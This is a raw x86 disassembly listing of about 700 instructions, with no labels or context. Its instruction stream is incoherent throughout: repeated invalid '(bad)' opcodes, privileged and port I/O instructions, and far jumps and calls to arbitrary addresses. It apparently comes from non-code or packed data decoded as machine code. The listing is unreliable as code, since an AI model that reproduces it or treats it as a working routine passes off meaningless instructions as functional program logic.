  40b874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b875:	mov    ds:0xee54c2d0,eax
  40b87a:	dec    eax
  40b87b:	jbe    0x40b7fe
  40b87d:	lea    esp,[edi+0x48af8f61]
  40b883:	aad    0xf3
  40b885:	in     eax,0xc4
  40b887:	cmp    cl,bh
  40b889:	jg     0x40b840
  40b88b:	and    eax,0x8be7d9d0
  40b890:	int    0x9c
  40b892:	add    al,BYTE PTR [ebp+0x6b]
  40b895:	adc    bl,cl
  40b897:	dec    ecx
  40b898:	cmp    DWORD PTR [esi],ecx
  40b89a:	add    dl,BYTE PTR [edx]
  40b89c:	aam    0x8d
  40b89e:	jl     0x40b873
  40b8a0:	stos   DWORD PTR es:[edi],eax
  40b8a1:	retf   
  40b8a2:	pop    esp
  40b8a3:	pop    edi
  40b8a4:	iret   
  40b8a5:	test   BYTE PTR [edx+0x2],dh
  40b8a8:	push   ss
  40b8a9:	cmp    edi,edi
  40b8ab:	mov    al,ds:0xf4f7e3b2
  40b8b0:	sbb    BYTE PTR [edi+esi*8+0x197388ec],0x26
  40b8b8:	xchg   esp,eax
  40b8b9:	retf   
  40b8ba:	bound  edx,QWORD PTR [eax]
  40b8bc:	pop    ebx
  40b8bd:	fs loop 0x40b914
  40b8c0:	fstp   TBYTE PTR [ecx-0x6]
  40b8c3:	lea    esi,[edi+0x3f]
  40b8c6:	lahf   
  40b8c7:	adc    al,0xc
  40b8c9:	scas   eax,DWORD PTR es:[edi]
  40b8ca:	int3   
  40b8cb:	test   BYTE PTR [eax+0x6c],bh
  40b8ce:	ss out 0xfd,al
  40b8d1:	sbb    al,0xfb
  40b8d3:	jae    0x40b925
  40b8d5:	and    al,dh
  40b8d7:	add    edx,ebp
  40b8d9:	mov    al,ds:0x63642fbf
  40b8de:	out    0x82,al
  40b8e0:	fcomi  st,st(0)
  40b8e3:	xchg   edi,eax
  40b8e4:	xchg   esi,eax
  40b8e5:	jge    0x40b88f
  40b8e7:	cld    
  40b8e8:	or     BYTE PTR [edi+0x5c],0x33
  40b8ec:	jo     0x40b8a6
  40b8ee:	mov    eax,ds:0xa6f6ff45
  40b8f3:	inc    esp
  40b8f4:	call   0x2a98e28f
  40b8f9:	push   edx
  40b8fa:	int3   
  40b8fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8fc:	jbe    0x40b8f5
  40b8fe:	pop    edx
  40b8ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b900:	fs iret 
  40b902:	sahf   
  40b903:	mov    dl,0x34
  40b905:	mov    edi,0xea8991f4
  40b90a:	fild   QWORD PTR [edx+edi*1+0x35]
  40b90e:	fst    DWORD PTR [edi]
  40b910:	in     eax,dx
  40b911:	lock in eax,0x8a
  40b914:	ins    DWORD PTR es:[edi],dx
  40b915:	xchg   ebx,eax
  40b916:	nop
  40b917:	out    dx,al
  40b918:	into   
  40b919:	and    BYTE PTR [ecx+0x7bcf4755],0xe6
  40b920:	push   ds
  40b921:	frstor [esi]
  40b923:	push   ecx
  40b924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b925:	ins    DWORD PTR es:[edi],dx
  40b926:	stos   DWORD PTR es:[edi],eax
  40b927:	dec    eax
  40b928:	sbb    al,0x4e
  40b92a:	add    eax,0xe33c1bfa
  40b92f:	add    al,0x53
  40b931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b932:	cli    
  40b933:	sysenter 
  40b935:	add    cl,BYTE PTR [edi+0x185b5b2f]
  40b93b:	shr    edi,cl
  40b93d:	scas   al,BYTE PTR es:[edi]
  40b93e:	js     0x40b956
  40b940:	sub    dh,dh
  40b942:	inc    edx
  40b943:	mov    BYTE PTR [esi],0x57
  40b946:	shr    BYTE PTR [ebx],cl
  40b948:	mov    dh,BYTE PTR [eax+esi*8-0x30]
  40b94c:	dec    ecx
  40b94d:	bound  edx,QWORD PTR [edi]
  40b94f:	(bad)  
  40b950:	jl     0x40b93a
  40b952:	sub    esp,DWORD PTR [eax]
  40b954:	outs   dx,DWORD PTR ds:[esi]
  40b955:	hlt    
  40b956:	and    DWORD PTR [esi-0x73],eax
  40b959:	inc    esp
  40b95a:	inc    esp
  40b95b:	pop    edx
  40b95c:	das    
  40b95d:	jns    0x40b8eb
  40b95f:	aam    0xac
  40b961:	and    dh,0xc
  40b964:	adc    esp,ecx
  40b966:	cmp    BYTE PTR [ebx],al
  40b968:	es jne 0x40b92a
  40b96b:	fcmovbe st,st(6)
  40b96d:	stos   DWORD PTR es:[edi],eax
  40b96e:	idiv   DWORD PTR [eax-0x78367569]
  40b974:	adc    DWORD PTR [edx+ecx*1-0x1e],edx
  40b978:	mov    dh,0xdf
  40b97a:	imul   esi,DWORD PTR ds:0x4bd9ce8a,0x45eaa7cc
  40b984:	xlat   BYTE PTR ds:[ebx]
  40b985:	mov    bl,0xff
  40b987:	cs xchg esi,eax
  40b989:	xor    BYTE PTR [ebx],0x65
  40b98c:	clc    
  40b98d:	test   al,0x48
  40b98f:	iret   
  40b990:	jmp    0x8274f327
  40b995:	sbb    BYTE PTR ds:0x46403aef,dh
  40b99b:	jl     0x40b989
  40b99d:	xchg   ebx,eax
  40b99e:	scas   al,BYTE PTR es:[edi]
  40b99f:	out    dx,al
  40b9a0:	cwde   
  40b9a1:	sbb    eax,0x5b4146d8
  40b9a6:	xor    ecx,DWORD PTR [edi-0x3fca068b]
  40b9ac:	fsubr  DWORD PTR [esi]
  40b9ae:	add    eax,edi
  40b9b0:	and    al,0xb9
  40b9b2:	sbb    edx,DWORD PTR [ecx]
  40b9b4:	inc    ecx
  40b9b5:	jmp    0x3321a92b
  40b9ba:	cwde   
  40b9bb:	add    eax,0xbfc59aa0
  40b9c0:	xor    edx,edx
  40b9c2:	adc    BYTE PTR [edi+ebp*8+0x4ab027f2],cl
  40b9c9:	leave  
  40b9ca:	fwait
  40b9cb:	cmp    edi,DWORD PTR [esi+ecx*8-0x8a7ba44]
  40b9d2:	fadd   QWORD PTR ss:[edx+0x7]
  40b9d6:	jg     0x40b964
  40b9d8:	popa   
  40b9d9:	mov    ds:0xde1e6b13,eax
  40b9de:	jbe    0x40b9b6
  40b9e0:	jno    0x40b9e4
  40b9e2:	scas   eax,DWORD PTR es:[edi]
  40b9e3:	retf   0x8a22
  40b9e6:	es xchg ecx,eax
  40b9e8:	mov    BYTE PTR [ecx-0x1a],0x86
  40b9ec:	adc    ebp,esp
  40b9ee:	sbb    eax,0xf3ff4b75
  40b9f3:	dec    edi
  40b9f4:	out    dx,eax
  40b9f5:	and    eax,0xd4ca4dcd
  40b9fa:	mov    esi,0x714c5c78
  40b9ff:	retf   0x96f2
  40ba02:	jbe    0x40b9b0
  40ba04:	inc    di
  40ba06:	xrelease xchg BYTE PTR [edx],ah
  40ba09:	mov    ah,al
  40ba0b:	add    dh,0xe9
  40ba0e:	das    
  40ba0f:	addr16 mov al,0x31
  40ba12:	inc    ecx
  40ba13:	xor    esp,DWORD PTR [esi-0x1e4f21d7]
  40ba19:	adc    dh,bl
  40ba1b:	cli    
  40ba1c:	add    BYTE PTR [ecx],cl
  40ba1e:	add    al,0x95
  40ba20:	pop    ecx
  40ba21:	jno    0x40ba5a
  40ba23:	(bad)  
  40ba24:	stos   BYTE PTR es:[edi],al
  40ba25:	pop    eax
  40ba26:	mov    eax,0x4d36725f
  40ba2b:	xchg   ecx,eax
  40ba2c:	mov    ds:0xe23f5493,eax
  40ba31:	test   al,0xb8
  40ba33:	fwait
  40ba34:	push   ecx
  40ba35:	stos   DWORD PTR es:[edi],eax
  40ba36:	cld    
  40ba37:	pop    ebx
  40ba38:	inc    ebp
  40ba39:	loope  0x40ba0e
  40ba3b:	mov    edx,fs
  40ba3d:	fs ins DWORD PTR es:[edi],dx
  40ba3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba40:	mov    bh,BYTE PTR [ecx-0x16]
  40ba43:	je     0x40ba89
  40ba45:	int3   
  40ba46:	sub    al,0x57
  40ba48:	and    BYTE PTR [ecx],ch
  40ba4a:	jbe    0x40ba67
  40ba4c:	ds xchg edi,eax
  40ba4e:	xchg   edi,eax
  40ba4f:	mov    ds:0xddc11236,al
  40ba54:	mov    eax,ds:0x49075e24
  40ba59:	out    0xc1,eax
  40ba5b:	es inc esi
  40ba5d:	clc    
  40ba5e:	push   ebx
  40ba5f:	xchg   esi,eax
  40ba60:	inc    eax
  40ba61:	xchg   ecx,eax
  40ba62:	pop    ecx
  40ba63:	xlat   BYTE PTR ds:[ebx]
  40ba64:	popa   
  40ba65:	cld    
  40ba66:	outs   dx,DWORD PTR ds:[esi]
  40ba67:	mov    dl,0x2b
  40ba69:	pop    es
  40ba6a:	push   eax
  40ba6b:	in     al,dx
  40ba6c:	push   ebp
  40ba6d:	in     eax,dx
  40ba6e:	jmp    0x40b9fb
  40ba70:	add    al,0x68
  40ba72:	jmp    0x40bab2
  40ba74:	ret    0x51aa
  40ba77:	fistp  QWORD PTR [edx]
  40ba79:	pop    edi
  40ba7a:	das    
  40ba7b:	push   0x967e2d46
  40ba80:	or     DWORD PTR [esi],edi
  40ba82:	jne    0x40ba97
  40ba84:	lods   al,BYTE PTR ds:[esi]
  40ba85:	outs   dx,DWORD PTR ds:[esi]
  40ba86:	repz (bad) 
  40ba88:	add    eax,0xaf96fde8
  40ba8d:	int    0x82
  40ba8f:	mov    ds:0x414017c5,eax
  40ba94:	dec    ecx
  40ba95:	mov    BYTE PTR [ebp-0x349bcb4f],bh
  40ba9b:	inc    edx
  40ba9c:	or     ebp,DWORD PTR [edi-0x4a4654d7]
  40baa2:	and    ebp,edx
  40baa4:	(bad)  
  40baa5:	cmp    al,0xed
  40baa7:	push   esp
  40baa8:	fst    QWORD PTR [ebx*1-0x7b9f9a01]
  40baaf:	retf   
  40bab0:	jl     0x40bacf
  40bab2:	mov    eax,ds:0x27ac1bcc
  40bab7:	test   dh,dh
  40bab9:	shl    BYTE PTR [edi],0xef
  40babc:	jne    0x40bb02
  40babe:	pop    ss
  40babf:	inc    eax
  40bac0:	outs   dx,DWORD PTR ds:[esi]
  40bac1:	dec    ecx
  40bac2:	add    eax,0x110e7cff
  40bac7:	jnp    0x40bb3e
  40bac9:	jl     0x40bab4
  40bacb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bacc:	push   esp
  40bacd:	or     BYTE PTR [ebx-0x4b81ecc],dl
  40bad3:	cdq    
  40bad4:	ffree  st(2)
  40bad6:	ins    BYTE PTR es:[edi],dx
  40bad7:	jp     0x40bace
  40bad9:	push   esi
  40bada:	ins    BYTE PTR es:[edi],dx
  40badb:	mov    ah,0x52
  40badd:	es cld 
  40badf:	mov    BYTE PTR [esi+0x1f5d3cc4],ah
  40bae5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bae6:	xlat   BYTE PTR ds:[ebx]
  40bae7:	pop    eax
  40bae8:	xchg   esi,eax
  40bae9:	out    dx,eax
  40baea:	fstp   QWORD PTR [esp+eax*4+0x46]
  40baee:	or     DWORD PTR [ebx-0xb169b0e],edi
  40baf4:	test   DWORD PTR [ecx],ecx
  40baf6:	mov    ebp,0x83f89be5
  40bafb:	jae    0x40bb79
  40bafd:	add    eax,DWORD PTR [eax+0x1b]
  40bb00:	aam    0x5a
  40bb02:	std    
  40bb03:	rcr    BYTE PTR [ecx-0x3d],1
  40bb06:	mov    eax,0xde29fd45
  40bb0b:	stos   DWORD PTR es:[edi],eax
  40bb0c:	call   0x8c02:0xb2bdcd16
  40bb13:	mov    bl,bh
  40bb15:	sub    DWORD PTR [ebx],ebp
  40bb17:	fwait
  40bb18:	pop    ebx
  40bb19:	sub    BYTE PTR [ebx],cl
  40bb1b:	xor    BYTE PTR [esi+0x60],dh
  40bb1e:	mov    esp,0x72b56bf3
  40bb23:	mov    bh,0x7c
  40bb25:	lds    esi,FWORD PTR ds:0x620a58d7
  40bb2b:	neg    BYTE PTR [ebp-0x7122c67c]
  40bb31:	or     al,0x34
  40bb33:	mov    al,0xec
  40bb35:	sub    edi,ecx
  40bb37:	mov    esi,0xa7f9b4b1
  40bb3c:	pop    es
  40bb3d:	cdq    
  40bb3e:	outs   dx,DWORD PTR ds:[esi]
  40bb3f:	mov    eax,ds:0x76cc55d1
  40bb44:	sub    esi,ebx
  40bb46:	inc    ebx
  40bb47:	mov    ds:0x62135d63,al
  40bb4c:	mov    cl,0x9c
  40bb4e:	sti    
  40bb4f:	clc    
  40bb50:	add    eax,0x2ed254c0
  40bb55:	xchg   al,al
  40bb57:	or     DWORD PTR [ebp+0x31],ebx
  40bb5a:	jb     0x40bb7f
  40bb5c:	ret    
  40bb5d:	push   edx
  40bb5e:	dec    edx
  40bb5f:	js     0x40bba6
  40bb61:	adc    al,0xb3
  40bb63:	mov    dl,0x49
  40bb65:	jmp    0xba34:0xfe97c153
  40bb6c:	(bad)  
  40bb6d:	fs adc al,0xd
  40bb70:	or     eax,0x3b7b814e
  40bb75:	cdq    
  40bb76:	lods   al,BYTE PTR ds:[esi]
  40bb77:	inc    esp
  40bb78:	repnz fistp QWORD PTR [eax+0x4a]
  40bb7c:	cli    
  40bb7d:	jns    0x40bb94
  40bb7f:	sbb    eax,0xa9e3deeb
  40bb84:	inc    ebp
  40bb85:	mov    dh,0x6a
  40bb87:	jmp    0x2fca0998
  40bb8c:	inc    edx
  40bb8d:	fisttp WORD PTR [esp-0x68]
  40bb91:	addr16 mov al,0x23
  40bb94:	imul   ecx,DWORD PTR [ebx],0x2402bb46
  40bb9a:	(bad)  
  40bb9b:	out    dx,eax
  40bb9c:	sub    dl,BYTE PTR [esp+edx*2-0x15]
  40bba0:	xchg   ebp,eax
  40bba1:	sahf   
  40bba2:	cmp    al,0xcd
  40bba4:	jl     0x40bbf6
  40bba6:	loop   0x40bbd1
  40bba8:	std    
  40bba9:	push   ecx
  40bbaa:	xor    al,0x88
  40bbac:	addr16 pop edi
  40bbae:	fisubr DWORD PTR [esi-0x50cb49eb]
  40bbb4:	and    esi,DWORD PTR [esi+esi*2]
  40bbb7:	mov    gs,eax
  40bbb9:	stos   DWORD PTR es:[edi],eax
  40bbba:	jns    0x40bc1e
  40bbbc:	repz pushf 
  40bbbe:	ret    
  40bbbf:	mov    edi,0x8b270e70
  40bbc4:	jl     0x40bc3c
  40bbc6:	out    dx,al
  40bbc7:	mov    ah,0x1a
  40bbc9:	cmp    DWORD PTR [ecx-0x444cb330],ecx
  40bbcf:	icebp  
  40bbd0:	(bad)  
  40bbd1:	dec    ebx
  40bbd2:	ror    ebx,0x86
  40bbd5:	pusha  
  40bbd6:	mov    cr6,esi
  40bbd9:	(bad)  
  40bbda:	mov    bl,0x52
  40bbdc:	loopne 0x40bbc1
  40bbde:	pop    edx
  40bbdf:	js     0x40bc5c
  40bbe1:	cmp    DWORD PTR [ecx*1-0x2d3e69cf],edx
  40bbe8:	jle    0x40bc5a
  40bbea:	jecxz  0x40bc4f
  40bbec:	push   ebp
  40bbed:	(bad)  
  40bbee:	data16 xlat BYTE PTR gs:[ebx]
  40bbf1:	dec    ebx
  40bbf2:	pop    esp
  40bbf3:	fidiv  DWORD PTR [esi]
  40bbf5:	cmp    eax,0x2ba05e47
  40bbfa:	mov    ds:0xf8977dbe,al
  40bbff:	xor    DWORD PTR [edi-0x37398e20],esp
  40bc05:	rcl    esi,cl
  40bc07:	pusha  
  40bc08:	fisttp WORD PTR ds:[esi+0x25]
  40bc0c:	adc    BYTE PTR ds:0x27972d19,bh
  40bc12:	seto   BYTE PTR [esi]
  40bc15:	fidivr WORD PTR [ebx-0x70]
  40bc18:	fdivr  st(6),st
  40bc1a:	outs   dx,DWORD PTR ds:[esi]
  40bc1b:	push   edi
  40bc1c:	ds pop esi
  40bc1e:	rcr    esi,0x93
  40bc21:	push   edx
  40bc22:	sbb    DWORD PTR ds:0xab69e36c,edi
  40bc28:	adc    al,0xe0
  40bc2a:	jle    0x40bbd8
  40bc2c:	mov    cl,0xb0
  40bc2e:	addr16 jno 0x40bbd2
  40bc31:	xor    DWORD PTR [eax-0x1a],edi
  40bc34:	pop    es
  40bc35:	add    DWORD PTR [ebx+0x2662a62f],edx
  40bc3b:	pop    ds
  40bc3c:	dec    esi
  40bc3d:	cmp    edi,DWORD PTR [ebp+0x537e1fee]
  40bc43:	push   0xffffffce
  40bc45:	pop    ebp
  40bc46:	push   ecx
  40bc47:	xchg   edi,eax
  40bc48:	std    
  40bc49:	ss xor al,0x85
  40bc4c:	or     al,0xbb
  40bc4e:	mov    al,0x3
  40bc50:	or     DWORD PTR [edi-0x71],esi
  40bc53:	or     cl,dh
  40bc55:	inc    eax
  40bc56:	dec    esi
  40bc57:	aad    0xab
  40bc59:	xor    eax,DWORD PTR ds:0xe1ed55d3
  40bc5f:	into   
  40bc60:	pop    edi
  40bc61:	fistp  DWORD PTR [edx+0x4d7e6706]
  40bc67:	(bad)  
  40bc68:	inc    ecx
  40bc69:	pusha  
  40bc6a:	js     0x40bbfd
  40bc6c:	pop    ss
  40bc6d:	add    ah,BYTE PTR [edx-0x4e]
  40bc70:	add    ebx,ebx
  40bc72:	fsubr  QWORD PTR [ebx-0xd00926a]
  40bc78:	lods   eax,DWORD PTR ds:[esi]
  40bc79:	in     eax,dx
  40bc7a:	jae    0x40bc9c
  40bc7c:	fcmovnu st,st(4)
  40bc7e:	ins    DWORD PTR es:[edi],dx
  40bc7f:	repz into 
  40bc81:	es cmc 
  40bc83:	adc    bl,BYTE PTR [ebp+0x3e]
  40bc86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc87:	out    dx,al
  40bc88:	out    dx,al
  40bc89:	jmp    0x5a12:0x51242577
  40bc90:	ins    DWORD PTR es:[edi],dx
  40bc91:	lods   eax,DWORD PTR ds:[esi]
  40bc92:	cdq    
  40bc93:	dec    esi
  40bc94:	cmp    esi,edi
  40bc96:	ins    BYTE PTR es:[edi],dx
  40bc97:	mov    ebx,0x673247b7
  40bc9c:	dec    edx
  40bc9d:	mov    esi,0x7e65f6b4
  40bca2:	jae    0x40bc71
  40bca4:	cmp    eax,0x487d89a0
  40bca9:	stos   BYTE PTR es:[edi],al
  40bcaa:	ins    BYTE PTR es:[edi],dx
  40bcab:	mov    ecx,DWORD PTR [ecx]
  40bcad:	cmp    eax,0x55e9fa66
  40bcb2:	cli    
  40bcb3:	xchg   ebp,eax
  40bcb4:	sbb    bh,dl
  40bcb6:	or     ah,bh
  40bcb8:	neg    ebx
  40bcba:	jecxz  0x40bc3f
  40bcbc:	sub    edi,DWORD PTR [ebp-0x46413875]
  40bcc2:	pop    edi
  40bcc3:	dec    eax
  40bcc4:	mov    ds:0x4502e5ed,al
  40bcc9:	pop    ss
  40bcca:	mov    dl,0xd8
  40bccc:	dec    ebp
  40bccd:	ss sbb al,0x16
  40bcd0:	fimul  DWORD PTR [edi]
  40bcd2:	loope  0x40bcbe
  40bcd4:	loop   0x40bccb
  40bcd6:	(bad)  
  40bcd7:	dec    ebp
  40bcd8:	clc    
  40bcd9:	ja     0x40bcec
  40bcdb:	mov    dl,BYTE PTR [edx-0x72fca534]
  40bce1:	imul   ebx
  40bce3:	aad    0xc0
  40bce5:	or     DWORD PTR [ecx],0x35
  40bce8:	xor    al,0x28
  40bcea:	imul   esp,DWORD PTR [esi+0x68],0xffffffc0
  40bcee:	push   0xde4fc552
  40bcf3:	out    dx,eax
  40bcf4:	jnp    0x40bd11
  40bcf6:	mov    edx,0x7160cb2a
  40bcfb:	ja     0x40bd0e
  40bcfd:	pop    edi
  40bcfe:	add    eax,0x6522fa9a
  40bd03:	ins    DWORD PTR es:[edi],dx
  40bd04:	and    ch,cl
  40bd06:	fimul  WORD PTR [eax+0x15]
  40bd09:	adc    BYTE PTR [eax+0x48c0a278],cl
  40bd0f:	mov    cl,ch
  40bd11:	jge    0x40bd42
  40bd13:	jp     0x40bd33
  40bd15:	dec    edi
  40bd16:	outs   dx,BYTE PTR ds:[esi]
  40bd17:	pop    ebx
  40bd18:	inc    eax
  40bd19:	push   ds
  40bd1a:	hlt    
  40bd1b:	aaa    
  40bd1c:	push   cs
  40bd1d:	sbb    esi,ebp
  40bd1f:	xlat   BYTE PTR ds:[ebx]
  40bd20:	(bad)  
  40bd21:	mov    esi,DWORD PTR [esi+0x78]
  40bd24:	mov    edi,0x80211010
  40bd29:	mov    eax,0x661d044
  40bd2e:	nop
  40bd2f:	jne    0x40bcbe
  40bd31:	xor    al,0x28
  40bd33:	mov    esi,0x560d46e5
  40bd38:	cmp    ah,dl
  40bd3a:	test   al,0xab
  40bd3c:	mov    edi,0x3333b73a
  40bd41:	add    eax,DWORD PTR [eax+0x58]
  40bd44:	sbb    DWORD PTR [ebx-0x3ff675a],edx
  40bd4a:	push   ds
  40bd4b:	out    dx,al
  40bd4c:	pop    esp
  40bd4d:	dec    esp
  40bd4e:	jl     0x40bdcf
  40bd50:	aad    0x3c
  40bd52:	pop    esp
  40bd53:	or     BYTE PTR [edi+0x39],bh
  40bd56:	mov    edi,DWORD PTR [edx]
  40bd58:	les    eax,FWORD PTR [ebx+ebp*2-0x1f]
  40bd5c:	dec    ebx
  40bd5d:	repnz aaa 
  40bd5f:	int    0x27
  40bd61:	call   0xdd77:0x321bfd3a
  40bd68:	daa    
  40bd69:	hlt    
  40bd6a:	sbb    DWORD PTR [edi+eiz*1],ecx
  40bd6d:	push   es
  40bd6e:	jnp    0x40bdef
  40bd70:	jecxz  0x40bd59
  40bd72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd73:	push   0x968e3e09
  40bd78:	cs dec esi
  40bd7a:	sahf   
  40bd7b:	lods   eax,DWORD PTR ds:[esi]
  40bd7c:	lahf   
  40bd7d:	push   esp
  40bd7e:	add    DWORD PTR [ecx-0x65814c04],edx
  40bd84:	adc    cl,ch
  40bd86:	mov    ss,ebx
  40bd88:	jbe    0x40bdcc
  40bd8a:	adc    bh,BYTE PTR [ebx+edx*8-0x6a650aea]
  40bd91:	sbb    al,0x54
  40bd93:	in     eax,0xa3
  40bd95:	mov    WORD PTR [edx-0x6a],es
  40bd98:	jbe    0x40bd90
  40bd9a:	daa    
  40bd9b:	inc    edx
  40bd9c:	inc    ebp
  40bd9d:	push   0x5ab23aa7
  40bda2:	jnp    0x40bd2a
  40bda4:	jl     0x40bd59
  40bda6:	xlat   BYTE PTR ds:[ebx]
  40bda7:	jmp    0x6d25:0x3fbafae3
  40bdae:	fidiv  DWORD PTR [esi+0x40]
  40bdb1:	cwde   
  40bdb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdb3:	test   BYTE PTR [ebx-0x6c5e00d4],bl
  40bdb9:	or     BYTE PTR [edx-0x622de2ff],ch
  40bdbf:	call   0xa60ff0f1
  40bdc4:	sbb    DWORD PTR [edi-0x6bfe81d0],ecx
  40bdca:	mov    ds:0x1eeb5ac,eax
  40bdcf:	xchg   DWORD PTR ds:0x56fa1ae5,esp
  40bdd5:	imul   edi,DWORD PTR [ecx+0xda7503b],0x9d3695d0
  40bddf:	ins    BYTE PTR es:[edi],dx
  40bde0:	mov    edx,0xc693f8f7
  40bde5:	jnp    0x40bdd3
  40bde7:	(bad)  
  40bde8:	mov    fs,WORD PTR [ecx+0x4]
  40bdeb:	jne    0x40be67
  40bded:	mov    DWORD PTR [ebx+0x1af4e732],ebp
  40bdf3:	sub    ah,cl
  40bdf5:	aad    0x59
  40bdf7:	stos   DWORD PTR es:[edi],eax
  40bdf8:	add    dl,BYTE PTR [ecx]
  40bdfa:	jo     0x40be4e
  40bdfc:	or     DWORD PTR [edi+0x69],ecx
  40bdff:	jle    0x40be48
  40be01:	out    dx,al
  40be02:	mov    fs,WORD PTR [edi+edx*4+0x2]
  40be06:	dec    esi
  40be07:	repz jnp 0x40be33
  40be0a:	iret   
  40be0b:	adc    al,0xb5
  40be0d:	xchg   ebx,eax
  40be0e:	xor    ebp,0xfa7d2199
  40be14:	mov    ebx,0x651d5b81
  40be19:	rcl    DWORD PTR [ecx-0x52db70c5],cl
  40be1f:	jo     0x40be95
  40be21:	(bad)  
  40be22:	cmp    ebx,DWORD PTR [ecx-0x65]
  40be25:	loopne 0x40be8b
  40be27:	sahf   
  40be28:	pusha  
  40be29:	jle    0x40be12
  40be2b:	pop    edx
  40be2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be2d:	push   0x705046ba
  40be32:	stos   DWORD PTR es:[edi],eax
  40be33:	mov    edx,0xbbfe364
  40be38:	dec    edi
  40be39:	push   ecx
  40be3a:	dec    esi
  40be3b:	xchg   ebp,eax
  40be3c:	sub    bh,BYTE PTR [eax]
  40be3e:	push   0x4a
  40be40:	sbb    al,0xc2
  40be42:	js     0x40bdef
  40be44:	int3   
  40be45:	retf   0x20d2
  40be48:	lods   al,BYTE PTR ds:[esi]
  40be49:	cmp    al,0x32
  40be4b:	test   eax,0x1445abc6
  40be50:	fisttp WORD PTR [esi]
  40be52:	outs   dx,DWORD PTR ds:[esi]
  40be53:	sub    ecx,ecx
  40be55:	pop    ebp
  40be56:	ins    BYTE PTR es:[edi],dx
  40be57:	push   es
  40be58:	pop    ss
  40be59:	test   BYTE PTR [edi],al
  40be5b:	ret    0xdb42
  40be5e:	imul   eax,DWORD PTR [ecx],0xffffffcd
  40be61:	stos   DWORD PTR es:[edi],eax
  40be62:	or     bl,BYTE PTR [edi+0x60e2e45b]
  40be68:	fsub   QWORD PTR [ebx+0x61]
  40be6b:	jno    0x40beca
  40be6d:	loopne 0x40bea0
  40be6f:	xchg   edi,eax
  40be70:	clc    
  40be71:	into   
  40be72:	cli    
  40be73:	push   eax
  40be74:	mov    edi,0x424f879c
  40be79:	enter  0xe45a,0xab
  40be7d:	mov    WORD PTR [ebx+0x2ac8064a],?
  40be83:	cmp    bl,BYTE PTR [edi+0x3c1a2ef9]
  40be89:	inc    edi
  40be8a:	jb     0x40bec9
  40be8c:	nop
  40be8d:	push   ebx
  40be8e:	ret    
  40be8f:	xchg   DWORD PTR [ecx],ebp
  40be91:	mov    WORD PTR [ebp+edi*1+0x28],ss
  40be95:	retf   0x458c
  40be98:	out    0x4f,al
  40be9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be9b:	in     eax,dx
  40be9c:	retf   
  40be9d:	aad    0xd
  40be9f:	add    eax,0x863daeb3
  40bea4:	pop    edi
  40bea5:	fnstcw WORD PTR [esi+0x2e]
  40bea8:	nop
  40bea9:	mov    cl,0xb8
  40beab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40beac:	das    
  40bead:	push   edx
  40beae:	rcl    DWORD PTR [esi+0x1e],0x27
  40beb2:	js     0x40bf16
  40beb4:	ficom  WORD PTR [edx-0x6405f700]
  40beba:	inc    edi
  40bebb:	(bad)  
  40bebc:	or     DWORD PTR [ecx-0x60df2d5f],edx
  40bec2:	sub    BYTE PTR [edi-0x52b2bd62],cl
  40bec8:	cmp    eax,0x95cc9b5a
  40becd:	mov    esi,0xb06abd8e
  40bed2:	push   esi
  40bed3:	std    
  40bed4:	inc    esp
  40bed5:	jge    0x40bf41
  40bed7:	loop   0x40beb6
  40bed9:	jg     0x40bebe
  40bedb:	xchg   ebx,eax
  40bedc:	ja     0x40bec4
  40bede:	fs push ecx
  40bee0:	jg     0x40bf07
  40bee2:	cmp    eax,esi
  40bee4:	data16 stos BYTE PTR es:[edi],al
  40bee6:	adc    ebx,DWORD PTR [edx-0x37]
  40bee9:	shr    edx,0x54
  40beec:	in     eax,dx
  40beed:	mov    ebx,0x504c298f
  40bef2:	stc    
  40bef3:	mov    edx,0x6202210d
  40bef8:	mov    al,ds:0xe93b3f24
  40befd:	mov    ds:0xbae95dd4,eax
  40bf02:	and    ebx,DWORD PTR [ebx+0x7529989b]
  40bf08:	sbb    eax,0xb86858d1
  40bf0d:	dec    edx
  40bf0e:	or     esp,edi
  40bf10:	push   es
  40bf11:	mov    eax,ds:0x5cb30f1e
  40bf16:	sti    
  40bf17:	cmp    DWORD PTR [eax],0x59
  40bf1a:	pop    edi
  40bf1b:	lock cmp DWORD PTR [eax],ebx
  40bf1e:	mov    ebx,0x8c1d86d0
  40bf23:	lock lods al,BYTE PTR ds:[esi]
  40bf25:	bound  esp,QWORD PTR [ebx]
  40bf27:	cmc    
  40bf28:	mov    edx,0x98cf0059
  40bf2d:	fs repnz stos DWORD PTR es:[edi],eax
  40bf30:	dec    esp
  40bf31:	pushf  
  40bf32:	outs   dx,BYTE PTR gs:[esi]
  40bf34:	xchg   esp,eax
  40bf35:	and    ebp,edx
  40bf37:	int3   
  40bf38:	xor    BYTE PTR [ebp+0x6b],bl
  40bf3b:	and    DWORD PTR [eax+eax*2-0x7c],ecx
  40bf3f:	or     BYTE PTR [esi-0x7b],al
  40bf42:	das    
  40bf43:	call   FWORD PTR [ebx-0x7a392e52]
  40bf49:	sub    al,0x7
  40bf4b:	(bad)  
  40bf4c:	adc    eax,0x9db39f6b
  40bf51:	and    eax,0xc02411da
  40bf56:	repz das 
  40bf58:	out    dx,eax
  40bf59:	xor    dh,BYTE PTR [ecx]
  40bf5b:	mov    ecx,0xf9c16728
  40bf60:	out    0xff,eax
  40bf62:	push   0x1
  40bf64:	adc    eax,0x1f2235d
  40bf69:	call   0xb70af481
  40bf6e:	add    al,0x5a
  40bf70:	push   esp
  40bf71:	jmp    0xa52a:0x84eda96b
  40bf78:	xor    dl,BYTE PTR [eax+0x4d]
  40bf7b:	mov    ebx,0xe7bf1cf
  40bf80:	daa    
  40bf81:	ds push sp
  40bf84:	cld    
  40bf85:	loope  0x40bfd3
  40bf87:	inc    ebx
  40bf88:	sahf   
